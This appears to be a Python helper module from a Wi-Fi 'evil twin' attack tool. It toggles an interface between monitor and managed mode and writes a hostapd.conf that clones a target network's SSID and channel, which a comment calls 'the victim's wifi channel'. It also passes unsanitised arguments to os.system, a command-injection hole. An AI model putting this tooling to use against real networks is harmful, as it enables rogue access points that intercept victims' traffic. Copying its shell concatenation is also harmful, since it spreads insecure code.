import os

def setMonitorMode(wlan):
    os.system("sudo ip link set " + wlan + " down")
    os.system("sudo iw " + wlan + " set type monitor")
    os.system("sudo ip link set " + wlan + " up")


def updateHostAP(known,BSSID):
    # changing hostapd.conf channel to the victim's wifi channel.
    filename = "./configs/hostapd.conf"
    text = str("#Set wifi interface" + "\n" + "interface=wlan0" + "\n" + "#Set network name" + "\n" + "ssid=" +
               str(known[BSSID][0]) + "\n" + "#Set channel" + "\n" + "channel=" + str(
        known[BSSID][1]) + "\n" + "#Set driver" + "\n" + "driver=nl80211")
    f = open(filename, 'w')
    f.close()
    f = open(filename, 'w')
    f.write(text)
    f.close()

def setManagerMode(wlan):
    os.system("sudo ip link set " + wlan + " down")
    os.system("sudo iw wlan0 set type managed")
    os.system("sudo ip link set " + wlan + " up")